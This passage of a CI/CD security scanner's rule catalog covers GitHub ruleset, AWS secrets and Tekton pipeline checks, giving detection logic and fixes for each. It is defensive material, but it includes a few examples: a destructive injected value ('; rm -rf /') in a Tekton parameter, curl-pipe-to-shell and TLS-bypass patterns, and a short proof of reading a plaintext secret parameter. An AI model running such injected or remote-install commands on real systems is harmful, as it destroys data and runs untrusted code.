**Recommendation.** Add a ``required_status_checks`` rule to every active ruleset and populate ``parameters.required_status_checks`` with the names of the contexts that must pass (Settings → Rules → <ruleset> → Add rule → Require status checks to pass before merging → pick the specific check runs). Without it, the ruleset is enforced but pushes / merges land without any of your tests, lint, security scans, or build verification actually being green — the ruleset documents that checks *exist* without requiring them to *pass*. The ruleset analog of SCM-008 (legacy branch-protection required checks).

An empty contexts list (``required_status_checks: []``) is the same as no rule — it documents the gate without filling it. Pick at least one canonical job name (the primary build) and add the rest of your CI matrix over time.

**Known false positives.**

- Some rulesets are deliberately scoped to non-CI concerns (commit-message format, tag-name pattern); those should be paired with a separate ruleset that enforces status checks on the same refs. Suppress with a rationale that names the parallel ruleset.

**Source:** [`SCM-033`](../providers/scm.md#scm-033) in the [SCM provider](../providers/scm.md).

#### `SCM-034`: Active ruleset doesn't block force-push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-034 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "non_fast_forward"``. Presence of the rule means force-pushes are blocked on the refs the ruleset targets. Passes silently when no rulesets are configured (legacy SCM-007 covers the gap).

**Recommendation.** Add a ``non_fast_forward`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Block force pushes). Without it, a force-push rewrites history on the target branch — commits that previously appeared in the audit trail disappear from the surface log, and anyone with push access can erase evidence of an earlier action. The ruleset analog of SCM-007 (legacy branch-protection force-push denial). Pair with SCM-006 (signed commits) so even a rewrite leaves verifiable signatures on the surviving commits.

**Known false positives.**

- Release-engineering rulesets sometimes deliberately allow force-push on a specific tag-pattern target (e.g. moving release tags). Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-034`](../providers/scm.md#scm-034) in the [SCM provider](../providers/scm.md).

#### `SCM-035`: Active ruleset doesn't block branch deletion <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-035 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "deletion"``. Presence of the rule means deletion is blocked. Passes silently when no rulesets are configured (legacy SCM-009 covers the gap).

**Recommendation.** Add a ``deletion`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Restrict deletions). Without it, anyone with push access to a ref the ruleset targets can delete that ref. The ruleset analog of SCM-009 (legacy branch-protection branch deletion denial). Mostly a hygiene control — deleted commits are recoverable from the reflog until garbage collection — but loss of the default-branch ref is a real operational disruption.

**Known false positives.**

- Rulesets that target ephemeral preview / feature branches legitimately allow deletion. Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-035`](../providers/scm.md#scm-035) in the [SCM provider](../providers/scm.md).

#### `SCM-036`: Active ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-036 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_signatures"``. Presence means commits to the targeted refs must carry a valid signature. Passes silently when no rulesets are configured (legacy SCM-006 covers the gap).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require signed commits). Without it, a compromised contributor account (or a stolen PAT) can push commits that appear to originate from any author the attacker names in the commit metadata. The signature requirement ties each commit to a key the contributor controls (SSH / GPG / sigstore via gitsign), so post-incident the audit log shows which commits were signed by the key vs forged. The ruleset analog of SCM-006 (legacy branch-protection signed-commit enforcement).

**Known false positives.**

- Teams that haven't yet rolled out signing keys for all contributors sometimes ship without signature enforcement to avoid blocking ordinary PRs. The right pattern is a phased rollout (configure the rule in ``evaluate`` mode first, then flip to ``active`` once contributors have their keys). Suppress with a rationale that names the rollout date.

**Source:** [`SCM-036`](../providers/scm.md#scm-036) in the [SCM provider](../providers/scm.md).

#### `SCM-037`: Active ruleset's pull_request rule doesn't dismiss stale reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-037 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** For every active ruleset with a ``pull_request`` rule, checks ``parameters.dismiss_stale_reviews_on_push`` is ``true``. Skips rulesets that don't have a ``pull_request`` rule at all — SCM-032 owns that surface. Passes silently when no rulesets are configured (legacy SCM-012 covers the gap).

**Recommendation.** On every active ruleset's ``pull_request`` rule, set ``parameters.dismiss_stale_reviews_on_push: true`` (Settings → Rules → <ruleset> → Require a pull request before merging → Dismiss stale pull request approvals when new commits are pushed). Without it, an attacker can land an approving review on a benign early version of the PR, then force-push (if not blocked by SCM-034) or otherwise update the head with malicious commits, and the original approval still counts toward the required-review gate.

The ruleset analog of SCM-012 (legacy branch-protection stale-review dismissal). Pair with SCM-032 (PR-review presence) — without dismissal, the review-count gate documents intent rather than reality once the PR has diverged from the approved state.

**Known false positives.**

- Some workflows use ephemeral review-bot accounts that auto-re-approve after push; dismissing on push then re-issuing the approval is the documented pattern. The rule still fires (the dismissal happens) and the re-approval lands separately. If your team operates a different review-velocity flow, suppress with a rationale that names the re-approval channel.

**Source:** [`SCM-037`](../providers/scm.md#scm-037) in the [SCM provider](../providers/scm.md).

#### `SCM-038`: Active ruleset doesn't require linear history <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-038 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_linear_history"``. Presence means merge commits to the targeted refs are rejected (only fast-forward / rebase / squash integration is allowed). Passes silently when no rulesets are configured — linear history has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``required_linear_history`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require linear history). Without it, merges into the targeted refs can introduce merge commits, which produce a branching history where two ancestors share authorship of the merge result. Linear history forces rebase- or squash-style integration so every commit on the trunk has a single parent and a single attributable author. This pairs with SCM-036 (signed commits) to give post-incident forensics a clean answer to *who wrote this code and when*: each commit on main has one signature, one author, one parent, one timestamp.

Merge commits aren't a direct attacker primitive — force-push (SCM-034) is the history-rewrite surface — but they obscure git-bisect and complicate ``git log --first-parent`` triage during an incident, and they hide which specific commits landed when a long-lived feature branch is merged.

**Known false positives.**

- Teams that prefer merge commits as a deliberate policy (e.g. to preserve the shape of long-lived feature branches in the history) legitimately ship without this rule. Suppress with a rationale that names the merge-strategy policy. The rule is a hygiene / auditability control, not a hard security gate.

**Source:** [`SCM-038`](../providers/scm.md#scm-038) in the [SCM provider](../providers/scm.md).

#### `SCM-039`: Active ruleset doesn't pin a required workflow <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-039 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "workflows"`` whose ``parameters.workflows`` is a non-empty list. An empty workflows list is treated as no rule (it documents the gate without filling it). Passes silently when no rulesets are configured — required workflows have no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``workflows`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require workflows to pass before merging) and pin at least one workflow by repository + path + ref. The ``workflows`` ruleset rule differs from ``required_status_checks`` (SCM-033) in a load-bearing way: status checks gate on a context *name* that the workflow chooses to report — if the PR edits the workflow YAML to remove or rename that context, the check vanishes and the gate documents intent rather than reality. The ``workflows`` rule pins the workflow file at a vetted ref (``main`` or a specific SHA) and forces *that* workflow to run against the PR's code regardless of what the PR did to the workflow YAML in its own branch. Closes the scan-removal supply-chain shape (attacker opens a PR that deletes ``.github/workflows/security-scan.yml`` and submits malicious code in the same PR).

Pin the workflow ref to either a long-lived branch the ruleset bypass actors don't have write access to or a specific SHA. A ref pinned to a branch the PR author controls undoes the protection.

**Known false positives.**

- Repos that don't run any workflow-based gating at all (pure code-review + signed-commits posture) legitimately ship without this rule. Suppress with a rationale that names the compensating controls. The rule fires LOW because most teams' security posture comes from status-checks (SCM-033); the workflows rule is the stricter scan-removal-resistant variant.

**Source:** [`SCM-039`](../providers/scm.md#scm-039) in the [SCM provider](../providers/scm.md).

#### `SCM-040`: Active ruleset doesn't gate on code scanning results <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-040 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review, [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "code_scanning"`` whose ``parameters.code_scanning_tools`` lists at least one tool. An empty tools list documents the gate without filling it and is treated as no rule. Passes silently when no rulesets are configured — the rule_type is ruleset-only and has no legacy branch-protection analog, so absence of rulesets means the gate simply doesn't exist (not that it's enforced elsewhere).

**Recommendation.** Add a ``code_scanning`` rule to the ruleset (Settings → Rules → <ruleset> → Add rule → Require code scanning results) and pin at least one tool (CodeQL, the most common choice) with a non-empty alerts threshold. The rule turns a passive code-scanning configuration (SCM-003 — default setup is on) into an active merge gate: the PR can't merge until the scan completes for the head SHA *and* the configured threshold isn't crossed (e.g. ``security_alerts_threshold: "high_or_higher"`` rejects merges that introduce high-severity findings). Closes the asymmetry between code scanning being enabled and the org actually blocking on its results.

If your org doesn't license GHAS (the underlying feature), this rule type isn't available. Suppress with a rationale that names the licensing constraint and carry the gate via ``required_status_checks`` (SCM-033) pointed at the named context the scan tool reports.

**Known false positives.**

- GHAS-licensing constraint: the ``code_scanning`` ruleset rule type requires GitHub Advanced Security on the repo. Repos on free / team tier can't configure this rule even when they run code scanning via third-party tools. Suppress with the licensing rationale and ensure SCM-033 carries the merge gate via the scan tool's reported status-check context.

**Source:** [`SCM-040`](../providers/scm.md#scm-040) in the [SCM provider](../providers/scm.md).

#### `SCM-041`: Active ruleset doesn't gate on a deployment environment <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-041 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_deployments"`` whose ``parameters.required_deployment_environments`` lists at least one environment. Empty lists are treated as no rule. Passes silently when no rulesets are configured — required-deployments enforcement has no legacy branch-protection analog in this scanner's coverage and is not separately evaluated.

**Recommendation.** Add a ``required_deployments`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require deployments to succeed before merging) and pin at least one environment (typically the staging environment that a CI pipeline deploys the PR's commit to). Pairs with SCM-023 (env reviewers) and SCM-024 (env branch policy): SCM-023/024 ensure the environment itself is gated; SCM-041 makes a successful deployment to that environment a merge prerequisite. Without it, a PR can merge into the default branch without a smoke-test deployment having run, even when the environment is rigorously configured. The ruleset analog of legacy branch protection's ``required_deployments`` checkbox.

An empty environments list (``required_deployment_environments: []``) documents the gate without filling it and is treated as no rule. Pick at least one environment name (typically ``staging`` or ``preview``) so the rule actually gates.

**Known false positives.**

- Repos that don't have GitHub deployment environments configured (or that gate via status-checks SCM-033 pointed at a deploy job's reported context) legitimately ship without this rule. Suppress with a rationale that names the compensating control. The rule fires LOW because most teams' deployment gating comes from the environment configuration itself (SCM-023, SCM-024); SCM-041 is the merge-side complement that closes the gap when an environment exists but isn't named in any ruleset.

**Source:** [`SCM-041`](../providers/scm.md#scm-041) in the [SCM provider](../providers/scm.md).

#### `SCM-042`: Active ruleset doesn't require merge queue <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-042 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "merge_queue"``. Presence means merges to the targeted refs must enter the queue. Passes silently when no rulesets are configured — merge queue has no legacy branch-protection analog (the feature is ruleset-only).

**Recommendation.** Add a ``merge_queue`` rule to every active ruleset that covers a high-throughput trunk (Settings → Rules → <ruleset> → Add rule → Require merge queue). Without it, two PRs that each pass ``required_status_checks`` (SCM-033) independently can both merge into the same trunk and produce a state where the combined diff wasn't actually validated — a class of integration regressions that CI on the individual PRs can't catch. The merge queue serializes merges and re-runs the configured checks against the queue's post-merge candidate commit before the merge lands, so the trunk always reflects a tested state.

Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE merge; SCM-042's merge queue ensures CI passes AFTER merge in queue order. The two gates address different failure modes — the queue closes the merge-race surface that per-PR CI can't see.

**Known false positives.**

- Low-throughput repos (one or two PRs landing per day) don't typically hit the merge-race shape this rule addresses; the operational cost of a merge queue can outweigh the benefit. Suppress with a rationale that names the merge-velocity profile. The rule fires LOW because most teams' CI integrity comes from status-checks (SCM-033); merge_queue is the additional concurrency-hardening control.

**Source:** [`SCM-042`](../providers/scm.md#scm-042) in the [SCM provider](../providers/scm.md).

#### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** AWS Signer profiles are the upstream of LMB-001's code-signing config. Without a profile defined, no function in the account can enforce code-signing, LMB-001's recommendation has nothing to point at. The profile is the foundation; the per-function code-signing config attaches it.

**Recommendation.** Create an AWS Signer profile with platform ``AWSLambda-SHA384-ECDSA`` and reference it from every Lambda code-signing config used by the pipeline. Without a profile, LMB-001 remediation isn't possible and release artifacts can't be signed at build time.

**Source:** [`SIGN-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SIGN-002`: AWS Signer profile is revoked or inactive <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sign-002 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).

**Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.

**Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SM-001`: Secrets Manager secret has no rotation configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sm-001 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Only secrets actually referenced by CodeBuild are checked, secrets used purely by application workloads are out of scope for a CI/CD scanner.

**Recommendation.** Enable automatic rotation on every Secrets Manager secret referenced by a CodeBuild project or CodePipeline. Unrotated secrets persist indefinitely, so a single leak (e.g. a build log that echoed the value) compromises the secret for its full lifetime.

**Source:** [`SM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SM-002`: Secrets Manager resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-sm-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A wildcard-principal Allow on a Secrets Manager resource policy means any principal in any AWS account can call ``GetSecretValue`` (subject to conditions, if any). Always combine with at least ``aws:SourceAccount`` or ``aws:PrincipalOrgID``, the lift-and-shift cross-account secret-access pattern needs scoping.

**Recommendation.** Remove Allow statements whose Principal is ``*`` from every Secrets Manager resource policy, or scope them with a ``Condition`` restricting the source account/org (``aws:PrincipalOrgID``). A wildcard-principal policy allows any AWS account to call ``GetSecretValue`` on the secret.

**Source:** [`SM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SSM-001`: SSM Parameter with secret-like name is not a SecureString <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ssm-001 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** An SSM ``String`` parameter is plaintext at rest and at API; ``ssm:GetParameter`` without any KMS Decrypt authority returns the value. ``SecureString`` adds KMS-encryption + the ``WithDecryption=true`` flag (which forces an explicit KMS authorization step). Secret-named parameters (``TOKEN``, ``PASSWORD``, ``KEY``) are almost always intended to be SecureString and rarely should not be.

**Recommendation.** Recreate the parameter with ``Type=SecureString`` and migrate consumers to the new name if needed. Plain ``String`` parameters are visible via ``ssm:GetParameter`` without any KMS authorization.

**Proof of exploit.**

# Vulnerable: secret-named parameter stored as plain ``String``.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type String

# Attack: any principal with the minimal ``ssm:GetParameter``
# permission reads the cleartext, no KMS authorization needed:
#
#   aws ssm get-parameter --name /prod/api/GITHUB_TOKEN
#   # Returns the plaintext, even for principals with
#   # ``kms:Decrypt`` explicitly denied account-wide.
#
# CloudTrail records the GetParameter call but not the value;
# defenders see the access only by name + principal, not what
# was read.

# Safe: SecureString forces a separate KMS authorization step.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type SecureString \
    --key-id alias/prod-secrets

# Now readers need BOTH ``ssm:GetParameter`` AND ``kms:Decrypt``
# on the named CMK, and the call only returns plaintext when
# ``WithDecryption=true`` is set (an explicit, auditable opt-in).

**Source:** [`SSM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SSM-002`: SSM SecureString uses the default AWS-managed key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ssm-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``alias/aws/ssm`` is the AWS-managed default for SecureString. Its key policy is fixed and account-wide. A customer-managed key gives you the same per-parameter key-policy + CloudTrail audit story you'd apply to Secrets Manager (which always uses a CMK).

**Recommendation.** Recreate SecureString parameters with ``KeyId`` pointing at a customer-managed KMS key. The default ``alias/aws/ssm`` key is shared across the account and its key policy cannot be audited or scoped per parameter.

**Source:** [`SSM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `TKN-001`: Tekton step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Applies to ``Task`` and ``ClusterTask`` kinds. The image must contain ``@sha256:`` followed by a 64-char hex digest. Any tag-only reference, including ``:latest``, fails.

**Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.

**Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).

#### `TKN-002`: Tekton step runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detection fires on a step with ``securityContext.privileged: true``, ``securityContext.runAsUser: 0``, ``securityContext.runAsNonRoot: false``, ``securityContext.allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every step. A privileged step shares the node's kernel namespaces; a malicious or compromised step image then has root on the build node, breaking the boundary between build and cluster.

**Source:** [`TKN-002`](../providers/tekton.md#tkn-002) in the [Tekton provider](../providers/tekton.md).

#### `TKN-003`: Tekton param interpolated unsafely in step script <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-003 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Fires on any ``$(params.X)`` or ``$(workspaces.X.path)`` token inside a ``script:`` body that isn't already wrapped in double quotes (`"$(params.X)"`). Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``$(params.<name>)`` directly into the step ``script:``. Tekton substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Receive the parameter through ``env:`` (``valueFrom: ...`` or ``value: $(params.<name>)``) and reference the env var quoted in the script (``"$NAME"``); or pass it as a positional argument to a shell function.

**Source:** [`TKN-003`](../providers/tekton.md#tkn-003) in the [Tekton provider](../providers/tekton.md).

#### `TKN-004`: Tekton Task mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-004 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Checks ``spec.volumes[].hostPath`` (legacy v1beta1 form), ``spec.workspaces[].volumeClaimTemplate.spec.storageClassName == 'hostpath'``, and ``spec.podTemplate`` host-namespace flags.

**Recommendation.** Use Tekton ``workspaces:`` backed by ``emptyDir`` or ``persistentVolumeClaim`` instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` on the Task's ``podTemplate``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the build break out of the pod and act as the underlying node.

**Source:** [`TKN-004`](../providers/tekton.md#tkn-004) in the [Tekton provider](../providers/tekton.md).

#### `TKN-005`: Literal secret value in Tekton step env or param default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-005 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than a ``$(params.X)`` / ``valueFrom`` reference.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``params[].default``. Task manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`TKN-005`](../providers/tekton.md#tkn-005) in the [Tekton provider](../providers/tekton.md).

#### `TKN-007`: Tekton run uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-007 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** An explicit ``serviceAccountName: default`` setting is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` on every ``TaskRun`` and ``PipelineRun`` to a least-privilege ServiceAccount that carries only the secrets and RBAC the run actually needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for build pods.

**Source:** [`TKN-007`](../providers/tekton.md#tkn-007) in the [Tekton provider](../providers/tekton.md).

#### `TKN-008`: Tekton step script pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-008 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection), [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Uses the cross-provider ``CURL_PIPE_RE`` and ``TLS_BYPASS_RE`` regexes so detection is consistent with the GHA / GitLab / CircleCI / Cloud Build providers.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.

**Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).

#### `TKN-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-009 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Detection mirrors GHA-006 / BK-009 / CC-006, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in the Task / Pipeline document. The rule only fires on artifact-producing Tasks (those that invoke ``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Tasks don't trip it.

**Recommendation.** Add a signing step to the Task, either a dedicated ``cosign sign`` step after the build, or use the official ``cosign`` Tekton catalog Task as a referenced step. The Task should sign by digest (``cosign sign --yes <repo>@sha256:<digest>``) so a re-pushed tag can't bypass the signature.

**Source:** [`TKN-009`](../providers/tekton.md#tkn-009) in the [Tekton provider](../providers/tekton.md).

#### `TKN-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-010 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Tasks.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > $(workspaces.output.path)/sbom.json`` runs in the official ``syft`` Tekton catalog Task. ``cyclonedx-cli`` and ``cdxgen`` are alternatives. Publish the SBOM as a Workspace result so downstream Tasks can consume it.

**Source:** [`TKN-010`](../providers/tekton.md#tkn-010) in the [Tekton provider](../providers/tekton.md).

#### `TKN-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-011 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials, [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Tekton Chains is the Tekton-native answer, once enabled on the cluster, every TaskRun's outputs are signed and attested without per-Task wiring. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``, ``witness run``). Tasks produced by tekton-chains pass on the ``cosign attest`` match.

**Recommendation.** After the build step, run ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` (or use the ``tekton-chains`` controller, which signs and attests every TaskRun automatically when configured). Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`TKN-011`](../providers/tekton.md#tkn-011) in the [Tekton provider](../providers/tekton.md).

#### `TKN-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-012 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec, dependency-check. Walks every Task / Pipeline / *Run document; passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner step. ``trivy fs $(workspaces.src.path)`` for source / filesystem; ``trivy image <ref>`` for container images. The official Tekton catalog ships ``trivy-scanner`` and ``grype-scanner`` Tasks if you'd rather reference one. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`TKN-012`](../providers/tekton.md#tkn-012) in the [Tekton provider](../providers/tekton.md).

#### `TKN-014`: Tekton step script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-014 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Drone. Tekton was a gap; this closes it. Only ``Task`` and ``ClusterTask`` documents are scanned because that's where Tekton step scripts live.

